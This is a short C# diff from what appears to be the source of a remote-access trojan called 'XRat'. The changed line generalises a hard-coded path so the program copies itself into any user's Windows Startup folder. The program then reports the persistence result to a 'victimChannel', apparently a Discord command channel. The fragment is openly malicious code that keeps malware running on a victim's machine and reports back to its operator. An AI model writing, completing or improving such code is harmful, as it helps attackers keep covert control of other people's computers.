@@ -119,7 +119,7 @@ class Program
 
             if (Settings.enable_startup)
             {
-                string path_to_startup = "C:\\Users\\ALEX\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
+                string path_to_startup = "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
                 bool status = Utils.CMD($"copy XRat.exe {path_to_startup} && exit");
                 await victimChannel.SendMessageAsync($"@everyone | Startup status: {status}");
             }
